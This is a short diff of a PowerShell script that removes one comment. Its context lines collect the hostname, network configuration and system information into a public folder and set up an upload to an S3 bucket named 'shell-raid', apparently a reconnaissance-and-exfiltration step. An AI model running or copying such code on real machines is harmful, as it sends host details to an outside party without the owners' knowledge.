@@ -12,7 +12,6 @@ $info = "Hostname: $hostname`nIP Config:`n$ipconfig`nSystem Info:`n$systeminfo"
 $info | Out-File -FilePath "C:\Users\Public\sysinfo.txt"
 
 # Upload the file to AWS S3
-# Specify the bucket name and key (file name in S3)
 $bucketName = "shell-raid"
 $s3Key = "sysinfo-$(hostname)-$(Get-Date -Format 'yyyyMMddHHmmss').txt"
 
